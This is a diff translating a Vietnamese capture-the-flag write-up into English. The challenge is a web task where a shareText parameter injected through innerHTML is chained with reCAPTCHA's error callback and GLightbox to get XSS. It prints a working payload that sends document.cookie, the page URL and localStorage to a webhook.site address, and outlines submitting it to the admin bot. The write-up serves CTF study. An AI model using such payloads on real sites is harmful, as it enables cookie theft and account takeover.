@@ -11,53 +11,53 @@ draft: false
 
 ![](./image.png)
 
-### Phân tích 
+### Analysis
 
-Người dùng nhập message và share link, URL có dạng:
+The user enters a message and shares a link. The URL has the form:
 
 ```text
 /?shareText=<message>
 ```
 
-Khi mở lại URL này, nội dung trong `shareText` được đưa vào DOM bằng `innerHTML`. Vì vậy ta có thể inject HTML vào trang.
+When this URL is reopened, the content in `shareText` is inserted into the DOM via `innerHTML`. So we can inject HTML into the page.
 
-Trong trang có hai thư viện:
+The page contains two libraries:
 
 ```text
 Google reCAPTCHA
 GLightbox
 ```
 
-Ta có thể chain hai thứ này để kích hoạt XSS.
+We can chain these two to trigger XSS.
 
-### Ý tưởng khai thác
+### Exploitation idea
 
-Google reCAPTCHA hỗ trợ thuộc tính:
+Google reCAPTCHA supports the attribute:
 
 ```html
 data-error-callback
 ```
 
-Khi sitekey không hợp lệ, reCAPTCHA sẽ gọi function được khai báo trong `data-error-callback`.
+When the sitekey is invalid, reCAPTCHA calls the function declared in `data-error-callback`.
 
 
-Chain khai thác:
+Exploitation chain:
 
 ```text
 shareText injection
-- thêm input class=glightbox
-- đặt XSS trong data-description
-- thêm reCAPTCHA với invalid sitekey
-- reCAPTCHA gọi data-error-callback="GLightbox"
-- GLightbox render data-description
-- XSS chạy
+- add an input class=glightbox
+- put the XSS in data-description
+- add a reCAPTCHA with an invalid sitekey
+- reCAPTCHA calls data-error-callback="GLightbox"
+- GLightbox renders data-description
+- the XSS runs
 ```
 
 ---
 
-### Payload XSS
+### XSS Payload
 
-Payload dùng để leak cookie về webhook:
+Payload used to leak the cookie to a webhook:
 
 ```html
 <input name=vote class=glightbox data-description="<img src=x onerror=fetch(`https://webhook.site/8eafb00c-ff64-4eaa-a987-16bbabf9b1f3?c=${encodeURIComponent(document.cookie)}&u=${encodeURIComponent(location.href)}&ls=${encodeURIComponent(JSON.stringify(localStorage))}`)>">
@@ -68,29 +68,29 @@ Payload dùng để leak cookie về webhook:
 <div class=g-recaptcha data-sitekey=x data-error-callback=random></div>
 ```
 
-Trong đó:
+Here:
 
 ```text
 data-sitekey=x
 ```
 
-làm reCAPTCHA lỗi.
+makes reCAPTCHA fail.
 
-Callback quan trọng là:
+The important callback is:
 
 ```text
 data-error-callback=GLightbox
 ```
 
-Nó gọi lại `GLightbox()` để thư viện nhận element `.glightbox` vừa được inject.
+It calls `GLightbox()` again so the library picks up the `.glightbox` element that was just injected.
 
-Webhook nhận được:
+The webhook receives:
 
 ![](./image-1.png)
 
-Vậy payload chạy thành công.
+So the payload runs successfully.
 
-### Gửi payload cho bot
+### Sending the payload to the bot
 
 ```text
 /bot
@@ -98,25 +98,25 @@ Vậy payload chạy thành công.
 
 ![](./image-2.png)
 
-Bot chỉ chấp nhận URL bắt đầu bằng:
+The bot only accepts URLs starting with:
 
 ```text
 http://localhost:1337
 ```
 
-Vì vậy không thể gửi link public dạng:
+So we cannot send a public link like:
 
 ```text
 https://braised-mozzarella-sticks-nestled-in-torched-soy-foam-03k8.gpn24.ctf.kitctf.de/?shareText=...
 ```
 
-Mà phải đổi thành:
+It must instead be changed to:
 
 ```text
 http://localhost:1337/?shareText=...
 ```
 
-### Exploit bằng Python
+### Exploit in Python
 
 ```python
 #!/usr/bin/env python3
@@ -145,7 +145,7 @@ print(r.text)
 print(target)
 ```
 
-Kiểm tra webhook:
+Check the webhook:
 
 ![](./image-3.png)
 
